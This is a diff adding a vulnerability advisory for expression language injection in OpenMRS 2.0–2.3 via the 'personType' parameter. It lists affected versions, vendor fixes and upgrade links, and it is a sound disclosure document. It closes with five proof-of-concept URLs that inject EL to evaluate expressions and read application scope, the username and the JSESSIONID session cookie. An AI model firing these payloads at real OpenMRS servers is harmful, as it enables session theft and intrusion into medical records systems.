@@ -1,0 +1,78 @@
+OpenMRS 2.3 (1.11.4) Expression Language Injection Vulnerability
+
+
+Vendor: OpenMRS Inc.
+Product web page: http://www.openmrs.org
+Affected version: OpenMRS 2.3, 2.2, 2.1, 2.0 (Platform 1.11.4 (Build 6ebcaf), 1.11.2 and 1.10.0)
+                  OpenMRS-TB System (OpenMRS 1.9.7 (Build 60bd9b))
+
+Summary: OpenMRS is an application which enables design
+of a customized medical records system with no programming
+knowledge (although medical and systems analysis knowledge
+is required). It is a common framework upon which medical
+informatics efforts in developing countries can be built.
+
+Desc: Input passed via the 'personType' parameter is not
+properly sanitised in the spring's expression language
+support via 'addPerson.htm' script before being used. This
+can be exploited to inject expression language (EL) and
+subsequently execute arbitrary Java code.
+
+
+Tested on: Ubuntu 12.04.5 LTS
+           Apache Tomcat/7.0.26
+           Apache Tomcat/6.0.36
+           Apache Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5288
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5288.php
+
+Affected: OpenMRS Core, Serialization.Xstream module, Metadata Sharing module
+Severity: Major
+Exploit: Remote Code Execution by an authenticated user
+
+Vendor Bug Fixes:
+
+Disabled serialization and deserialization of dynamic proxies
+Disabled deserialization of external entities in XML files
+Disabled spring's Expression Language support
+
+https://talk.openmrs.org/t/openmrs-security-advisories-2015-11-30/3868
+https://talk.openmrs.org/t/critical-security-advisory-2015-11-25/3824
+https://wiki.openmrs.org/display/RES/Release+Notes+2.3.1
+http://openmrs.org/2015/12/reference-application-2-3-1-released/
+https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.9.10
+https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.10.3
+https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.11.5
+https://modules.openmrs.org/modulus/api/releases/1308/download/serialization.xstream-0.2.10.omod
+https://modules.openmrs.org/modulus/api/releases/1309/download/metadatasharing-1.1.10.omod
+https://modules.openmrs.org/modulus/api/releases/1303/download/reporting-0.9.8.1.omod
+
+OpenMRS platform has been upgraded to version 1.11.5
+Reporting module has been upgraded to version 0.9.8.1
+Metadata sharing module has been upgraded to version 1.1.10
+Serialization.xstream module has been upgraded to version 0.2.10
+
+Who is affected?
+
+Anyone running OpenMRS Platform (1.9.0 and later)
+Anyone running OpenMRS Reference Application 2.0, 2.1, 2.2, 2.3
+Anyone that has installed the serialization.xstream module except for the newly released 0.2.10 version.
+Anyone that has installed the metadatasharing module except for the newly released 1.1.10 version.
+
+
+02.11.2015
+
+--
+
+
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm?personType=${3*3}&viewType=
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm?personType=${applicationScope}&viewType=
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm?personType=%3Ci%3E${username}&viewType=
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm?personType=${cookie[%22JSESSIONID%22].value}
+http://127.0.0.1:8080/openmrs/admin/person/addPerson.htm?personType=${Condition?%22Ok%22:3%3C2}
